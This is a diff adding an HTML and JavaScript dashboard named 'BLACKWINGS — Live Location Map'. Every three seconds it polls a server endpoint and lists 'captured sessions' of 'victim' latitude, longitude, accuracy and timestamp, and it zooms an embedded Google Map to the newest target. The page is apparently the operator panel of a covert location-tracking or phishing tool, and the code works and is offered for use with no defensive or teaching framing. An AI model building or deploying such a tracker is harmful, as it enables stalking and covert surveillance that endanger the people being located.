@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BLACKWINGS — Live Location Map</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#0d0620;color:#fff;padding:20px}
+  h1{color:#ff2d78;letter-spacing:2px;margin-bottom:16px;font-size:22px}
+  .wrap{display:flex;gap:16px;flex-wrap:wrap}
+  #frame-wrap{flex:2;min-width:320px}
+  iframe#gmap{width:100%;height:560px;border:1px solid #ff2d78;border-radius:12px;background:#000}
+  #side{flex:1;min-width:280px}
+  h2{font-size:16px;color:#b8aee0;margin-bottom:8px}
+  ul{list-style:none;margin-top:8px}
+  li{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);border-radius:10px;padding:12px;margin-bottom:10px;font-size:13px;line-height:1.6}
+  li b{color:#ffb347}
+  a{color:#2ecc71}
+  .hint{color:#8f84bd;font-size:12px;margin-top:8px}
+</style>
+</head>
+<body>
+<h1>BLACKWINGS — LIVE LOCATION MAP</h1>
+<div class="wrap">
+  <div id="frame-wrap">
+    <iframe id="gmap" src="https://maps.google.com/maps?q=0,0&z=2&output=embed" frameborder="0" allowfullscreen></iframe>
+    <p class="hint">Auto-updates every 3 seconds with the newest victim location.</p>
+  </div>
+  <div id="side">
+    <h2>Captured sessions</h2>
+    <ul id="sessions"><li>Waiting for targets…</li></ul>
+  </div>
+</div>
+<script>
+function poll(){
+  fetch('/location/latest')
+    .then(function (r) { return r.json(); })
+    .then(function (data) {
+      var ul = document.getElementById('sessions');
+      if (!data.length) { ul.innerHTML = '<li>Waiting for targets…</li>'; return; }
+      ul.innerHTML = '';
+      data.forEach(function (s) {
+        var li = document.createElement('li');
+        var gm = 'https://www.google.com/maps?q=' + s.lat + ',' + s.lon;
+        li.innerHTML = '<b>' + s.session_id + '</b><br>' +
+          'Lat: ' + s.lat.toFixed(6) + ' / Lon: ' + s.lon.toFixed(6) +
+          (s.accuracy_m ? ' (&plusmn;' + s.accuracy_m + 'm)' : '') +
+          '<br>' + (s.time || '') +
+          '<br><a href="' + gm + '" target="_blank">Open in Google Maps &#8599;</a>';
+        ul.appendChild(li);
+      });
+      var top = data[0];
+      document.getElementById('gmap').src =
+        'https://maps.google.com/maps?q=' + top.lat + ',' + top.lon + '&z=16&output=embed';
+    })
+    .catch(function () {});
+}
+poll();
+setInterval(poll, 3000);
+</script>
+</body>
+</html>
+
